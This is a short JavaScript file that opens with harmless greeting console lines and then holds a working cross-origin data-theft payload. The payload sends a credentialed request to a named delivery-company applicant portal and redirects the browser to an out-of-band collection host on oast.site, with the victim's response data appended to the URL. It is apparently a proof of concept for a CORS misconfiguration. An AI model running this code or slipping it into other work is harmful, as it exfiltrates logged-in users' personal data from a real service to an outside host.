console.log("Hello, World!");
console.log("This is the index.js file.");
console.log("Welcome to the project!");

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open("get", "https://myportal.drivers.dpd.co.uk/esg/odf/applicant", true);
req.withCredentials = true;
req.send();

function reqListener() {
  location =
    "//htwayb25ut8nx5cah3pk7i3th126uwm8u.oast.site/logging?key=" +
    this.responseText;
}
